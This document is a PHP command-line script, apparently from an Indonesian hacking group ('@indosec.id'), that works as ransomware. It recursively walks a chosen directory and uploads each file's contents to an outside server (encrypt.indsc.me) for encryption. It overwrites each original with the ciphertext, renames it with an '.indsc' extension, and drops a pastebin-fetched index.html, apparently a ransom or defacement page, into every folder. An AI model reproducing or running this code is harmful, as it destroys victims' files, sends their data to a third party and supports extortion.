<?php
	
	echo "
  ad8888888888ba
 dP'         `'8b,
 8  ,aaa,       'Y888a     ,aaaa,     ,aaa,  ,aa,
 8  8' `8           '88baadP''''YbaaadP''''YbdP''Yb
 8  8   8              '''        '''      ''    8b
 8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
 8  `'''       ,d8'
 Yb,         ,ad8'    @Brilly - @indosec.id - Encrypt File
  'Y8888888888P'
	";
	
	echo "\n\n[+] Directory => ";
	$dir = trim(fgets(STDIN));
	

	echo "[+] Proses Encrypt, Loading ... \n\n";
	echo "[+] Encrypt Semua File...\n";

	function listFolderFiles($dir){
	    
	    if (is_dir($dir)) {

		    $ffs = scandir($dir);

		    unset($ffs[array_search('.', $ffs, true)]);
		    unset($ffs[array_search('..', $ffs, true)]);

		    /* create index file */
		    $index = file_get_contents('https://pastebin.com/raw/aGZ6BeTH');

		    $_o = fopen($dir."/index.html", "w");
			fwrite($_o, $index);
			fclose($_o);


		    if (count($ffs) < 1)
		        return;

		    foreach($ffs as $ff){

		    	$files = $dir."/".$ff;
		        
		    	if(!is_dir($files)){
		    		
		    		/* encrypt file */
		    		$file = file_get_contents($files);
		    		$_a = base64_encode($file);
					
		    		/* proses curl */
		    		$ch = curl_init();
		    		curl_setopt($ch, CURLOPT_URL, 'http://encrypt.indsc.me/api.php?type=encrypt');
		    		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		    		curl_setopt($ch, CURLOPT_POSTFIELDS, "text=$_a");
		    		$x = json_decode(curl_exec($ch));

		    		if($x->status == 'success'){
		    			$_enc = base64_decode($x->data);

						$o = fopen($files, "w");
						fwrite($o, $_enc);
						fclose($o);
						rename($files, $files.".indsc");

		    			echo "\n[+] $files => Success Encrypted";
		    		}

		    	}
		        if(is_dir($dir.'/'.$ff)) listFolderFiles($dir.'/'.$ff);
		    }

		    echo "\n\n[+] Done !\n\n";
	    }else{
	    	echo "bukan dir";
	    }
	}

	listFolderFiles($dir);
?>